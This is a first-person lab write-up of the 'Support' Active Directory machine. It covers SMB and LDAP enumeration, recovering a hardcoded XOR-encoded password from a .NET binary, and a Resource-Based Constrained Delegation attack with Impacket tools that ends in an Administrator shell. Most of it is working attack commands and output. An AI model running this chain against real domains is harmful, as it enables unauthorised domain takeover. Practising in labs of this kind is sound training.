# Enumeration

As always, I'll start with an nmap scan to identify the open ports on the target:

```
rota@rota-mint:~/labs.htb/support$ nmap -p- --min-rate 5000 -oN enum/scans/ports.txt 10.129.230.181 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-10 14:03 AEST
Nmap scan report for 10.129.230.181
Host is up (0.18s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49678/tcp open  unknown
49690/tcp open  unknown
49703/tcp open  unknown
49741/tcp open  unknown
```

From this output alone, I'm already leaning towards this host being a domain controller.
Ports 88, 135, 445, 3268, 3269 usually point towards that being true.

Taking the ports.txt file and running it through some grep/cut/paste magic and piping it to `ports`, I'll get a file with all open ports in an nmap acceptable format for the service/script scan:

```
rota@rota-mint:~/labs.htb/support$ nmap -p $(cat ports) -sV -sC --min-rate 5000 -oA enum/scans/svc-scan 10.129.230.181 -Pn

Nmap scan report for 10.129.230.181
Host is up (0.22s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-09 04:14:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49741/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-09T04:15:53
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -23h56m07s
```

The first valuable information I notice from this output is the domain name and host name: `support.htb` and `DC`. I'll add this to the hosts file and continue analysing the output.

Nothing particularly interesting sticks out about the service versions, however, if I get stuck later on, they're saved to a file to research CVEs.

The last important bit of information I see is the clock skew. To avoid forgetting and dealing with errors later during any kerberos auth attempts, I'll match the targets time with `ntpdate`.

## Service Enumeration

The services I have available are:
RPC
SMB
LDAP
DNS
WINRM

The most appealing of the lot is usually SMB, as it can be a good source of leaked information and sometimes files containing credentials so that's where I'll start.

### SMB

Starting with a null auth attempt listing shares, I get an access denied using no user or pass.

```
rota@rota-mint:~/labs.htb/support$ nxc smb support.htb -u '' -p '' --shares
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.230.181  445    DC               [+] support.htb\: 
SMB         10.129.230.181  445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

I'll try again with a false username to see if that changes the output and if that does nothing I'll attempt it with the `Guest` account.

```
rota@rota-mint:~/labs.htb/support$ nxc smb support.htb -u 'false' -p '' --shares
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.230.181  445    DC               [+] support.htb\false: (Guest)
SMB         10.129.230.181  445    DC               [*] Enumerated shares
SMB         10.129.230.181  445    DC               Share           Permissions            Remark
SMB         10.129.230.181  445    DC               -----           -----------            ------
SMB         10.129.230.181  445    DC               ADMIN$                                 Remote Admin
SMB         10.129.230.181  445    DC               C$                                     Default share
SMB         10.129.230.181  445    DC               IPC$            READ                   Remote IPC
SMB         10.129.230.181  445    DC               NETLOGON                               Logon server share 
SMB         10.129.230.181  445    DC               support-tools   READ                   support staff tools
SMB         10.129.230.181  445    DC               SYSVOL                                 Logon server share
```

This works and proceeds to list a pair of readable shares, lovely.

Before exploring the shares I'll test the `Guest` account in case of any different interactions (despite the output showing `(Guest)`, more for curiosity.)

This returns an identical output with the user now being `Guest` instead of `false (Guest)`

(A simple observation but worth noting for the sake of these notes: In this environment, Guest permissions are afforded to "guest" accounts - however, blank user:pass returns access denied.)

IPC$ isn't often lucrative for my purposes, so I'll first be looking into the custom readable share `support-tools` for any low hanging fruit.

To do this, I'll be using `smbclient` to manually enumerate the share.

```
rota@rota-mint:~/labs.htb/support$ smbclient -U false -N //10.129.230.181/support-tools
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jul 21 03:01:06 2022
  ..                                  D        0  Sat May 28 21:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 21:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 21:19:55 2022
  putty.exe                           A  1273576  Sat May 28 21:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 21:19:31 2022
  UserInfo.exe.zip                    A   277499  Thu Jul 21 03:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 21:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 21:19:43 2022
```

Immediately I'm met with a .zip file named `UserInfo.exe.zip`. The title implies it could be valuable, hopefully including a password or two.

I'll use get and make a directory to unzip the file into, then begin inspecting the unzipped contents.

```
rota@rota-mint:~/labs.htb/support/UserInfo$ unzip ../UserInfo.exe.zip 
Archive:  ../UserInfo.exe.zip
  inflating: UserInfo.exe            
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: Microsoft.Extensions.DependencyInjection.dll  
  inflating: Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: System.Buffers.dll      
  inflating: System.Memory.dll       
  inflating: System.Numerics.Vectors.dll  
  inflating: System.Runtime.CompilerServices.Unsafe.dll  
  inflating: System.Threading.Tasks.Extensions.dll  
  inflating: UserInfo.exe.config
```

Running `file` on `UserInfo.exe` shows that it's a .Net binary. To explore this further I'll use the ILSpy extension in vscode.

After looking around a short while, I found a section in `UserInfo.exe` named `LdapQuery` defines a password value as `Protected.getPassword`. If I navigate further down the tree, I find a section named `Protected`, and inside of that, an encoded password!

```
internal class Protected
{
    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

    private static byte[] key = Encoding.ASCII.GetBytes("armando");

    public static string getPassword()
    {
        byte[] array = Convert.FromBase64String(enc_password);
        byte[] array2 = array;
        for (int i = 0; i < array.Length; i++)
        {
            array2[i] = (byte)(array[i] ^ key[i % key.Length] ^ 0xDF);
        }
        return Encoding.Default.GetString(array2);
    }
}
```

The code details the encoded password, with the script to make it presentable. 
I'm actually unfamiliar with the decoding process here, so I'll do some research to see what my options are and revisit alternatives more after the box.

From what I understand, I should be able to rewrite the c# code locally in python to get the same result as any other method.

After doing more specific research converting the c# code to python, the script I have created is:
```
rota@rota-mint:~/labs.htb/support$ python
Python 3.12.3 (main, Jun 19 2026, 12:46:00) [GCC 13.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
>>> enc_pass = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
>>> key = b"armando"
>>> data = bytearray(base64.b64decode(enc_pass))
>>> for i in range(len(data)):
...     data[i] = data[i] ^ key[i % len(key)] ^ 223;
... 
>>> print(data.decode())
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

this returns the decrypted value:
`nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

With this being a suspected password, I now have to look for the user it belongs to. I'll have another look through the ILSpy source for `UserInfo.exe` and try identify any users or the account in charge of the application.

In the `LdapQuery` section found earlier, I actually missed the user the first time round:
```
string password = Protected.getPassword();
entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
```

So now I have:
`ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

To confirm I'll attempt LDAP auth with these credentials:

```
rota@rota-mint:~/labs.htb/support$ nxc ldap support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
LDAP        10.129.230.181  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.230.181  389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
```

And it works!

Next, I'll use bloodhound to visualise the permissions of the ldap account and check for any short routes to higher privileges.

There's many ways to collect bloodhound data, my favourite being through the built-in bloodhound flag in NetExec

For reference here's the command
```
rota@rota-mint:~/labs.htb/support$ nxc ldap support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --bloodhound -c All --dns-server 10.129.230.181
```

And with that I can injest the data to bloodhound and start exploring.

Checking the `Member Of` section displays that the `ldap` user is a member of the `Domain Users` group. This ticks one of the boxes required for kerberoasting immediately, so that's the first thing I want to try.

To check if we can kerberoast any of the users in this environment I'll attempt using `GetUserSPNs.py` and try retrieve a list of vulnerable users.

```
rota@rota-mint:~/labs.htb/support$ GetUserSPNs.py 'support.htb/ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

Well, that didn't work.

Since the quick and dirty kerberoast didn't work, my next step is to enumerate authenticated SMB and LDAP for any useful credentials or information.

SMB authentication returns successful so I should be able to return a list of users with the --users flag and pipe the output into a file for some editing with the goal of having a clean user list:

```
rota@rota-mint:~/labs.htb/support$ cat users.txt
Administrator
Guest
krbtgt
ldap
support
smith.rosario
hernandez.stanley
wilson.shelby
anderson.damian
thomas.raphael
levine.leopoldo
raven.clifton
bardot.mary
cromwell.gerard
monroe.david
west.laura
langley.lucy
daughtler.mabel
stoll.rachelle
ford.victoria
```

Now I have a password sprayable list in case I come across a password without a user.

I'll also check what shares are available to the `ldap` user:

```
rota@rota-mint:~/labs.htb/support$ nxc smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --shares
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.230.181  445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
SMB         10.129.230.181  445    DC               [*] Enumerated shares
SMB         10.129.230.181  445    DC               Share           Permissions            Remark
SMB         10.129.230.181  445    DC               -----           -----------            ------
SMB         10.129.230.181  445    DC               ADMIN$                                 Remote Admin
SMB         10.129.230.181  445    DC               C$                                     Default share
SMB         10.129.230.181  445    DC               IPC$            READ                   Remote IPC
SMB         10.129.230.181  445    DC               NETLOGON        READ                   Logon server share 
SMB         10.129.230.181  445    DC               support-tools   READ                   support staff tools
SMB         10.129.230.181  445    DC               SYSVOL          READ                   Logon server share 

```

It was unlikely `ldap` would have access to `C$` but never hurts to check.

Moving on to LDAP, looking for any missed users and notes potentially containing sensitive information.

I want as much relevant information as possible without missing anything... quite a tricky procedure. My first step is to query the entire database and narrow it down based on the output:

```
rota@rota-mint:~/labs.htb/support$ nxc ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --query "(objectClass=*)" ""
```

This command returns a whole lot of information, some of which is definitely just clutter in terms of analysis. To narrow it down exclusively to user information, I'll query `objectClass=user` next and review the output.

There's definitely a more efficient way of doing this which I'll be researching later.
For now, looking through the output I notice a unique field in the `support` user's listing:

```
rota@rota-mint:~/labs.htb/support$ nxc ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --query "(objectClass=user)" ""

LDAP        10.129.230.181  389    DC               cn                   support                                                                                         
LDAP        10.129.230.181  389    DC               c                    US                                                                                              
LDAP        10.129.230.181  389    DC               l                    Chapel Hill                                                                                     
LDAP        10.129.230.181  389    DC               st                   NC                                                                                              
LDAP        10.129.230.181  389    DC               postalCode           27514                                                                                           
LDAP        10.129.230.181  389    DC               distinguishedName    CN=support,CN=Users,DC=support,DC=htb                                                           
LDAP        10.129.230.181  389    DC               instanceType         4                                                                                               
LDAP        10.129.230.181  389    DC               whenCreated          20220528111200.0Z                                                                               
LDAP        10.129.230.181  389    DC               whenChanged          20220528111201.0Z                                                                               
LDAP        10.129.230.181  389    DC               uSNCreated           12617                                                                                           
LDAP        10.129.230.181  389    DC               info                 Ironside47pleasure40Watchful
```

This kind of resembles a password... I'll try authenticating to SMB, LDAP, and WinRM with the credentials:
`support:Ironside47pleasure40Watchful`

To my surprise, it works for all three services.
This means I now have shell access to the target.

Before going further with this, I'll check what information bloodhound gives us, marking `support` as owned.
If bloodhound returns nothing, my step will be enumerating the privileges of this user, hopefully resulting in the theft of important registry files due to SeBackupPrivilege or abuse of the SeImpersonatePrivilege to escalate privileges.
(Likely wishful thinking)

Bloodhound actually returns golden loot in the form of `GenericAll` over `DC.support.htb`!

I notice it lists a Resource-Based Constrained Delegation attack as the ideal path for GenericAll abuse in this case.
This attack type is new to me in practice, so I'll give it a go following bloodhounds directions.

To execute this I first must add a new computer to the domain using `addcomputer.py`, then configure the target object so the new computer can delegate to it. The final step is to request a service ticket for the account we want to impersonate - in this case Administrator.

Starting off with adding the fake computer:
```
rota@rota-mint:~/labs.htb/support$ addcomputer.py -computer-name 'FALSE$' -computer-pass 'F4LS3!' 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account FALSE$ with password F4LS3!.
```

Then I'll use `rbcd.py` to add delegation rights
```
rota@rota-mint:~/labs.htb/support$ rbcd.py -delegate-from 'FALSE$' -delegate-to 'DC$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] unsupported hash type MD4
```

I've learned from picking these errors up over a few labs that you can edit the openssl.cnf file to allow MD4, however I'll try kerberos auth first:
```
rota@rota-mint:~/labs.htb/support$ rbcd.py -delegate-from 'FALSE$' -delegate-to 'DC$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful' -k
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] FALSE$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     FALSE$       (S-1-5-21-1677581083-3380853377-188903654-6101)
```

This works a treat.

Now with the machine set up, I can use it to impersonate any of the users on the target.

I'll use `getST.py` to grab a service ticket as the `Administrator` user:
```
rota@rota-mint:~/labs.htb/support$ getST.py -spn 'cifs/DC.support.htb' -impersonate 'Administrator' 'support.htb/FALSE$:F4LS3!'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
```
(Note: This will error if you have a krb5ccname set... saves a lot of time remembering that)

This returns the ticket to a file that I can set as the `$KRB5CCNAME` variable and use it to "pass the ticket".

-----
### An interruption from your host:

### Where I went wrong

So I got excited and ran ahead of the notes a little... and after attempting to pass the ticket to evil-winrm it errored... If you're reading this you may know exactly why and be laughing, however I completely missed it.

When I exported the ccache file, I didn't take into account the ticket type or the service I was trying to access. This resulted in a bit of trial an error (expecting it to be a syntax error on my end) with different syntax for evil-winrm registering the ccache and ultimately realising... a cifs ticket won't work on an HTTP service. lol. At this point I took a break and got some water, started again a few minutes later from the ticket request and everything worked like magic.

-----

Now, with the *correct* ticket from the *correct* command:
```
rota@rota-mint:~/labs.htb/support$ getST.py -spn 'HTTP/DC.support.htb' -impersonate 'Administrator' 'support.htb/FALSE$:F4LS3!'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@HTTP_DC.support.htb@SUPPORT.HTB.ccache
```

I can export this one and attempt to authenticate via `evil-winrm`.

```
rota@rota-mint:~/labs.htb/support$ evil-winrm -i DC.support.htb -r SUPPORT.HTB

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

With Adminsitrator shell access, that's domain compromise!


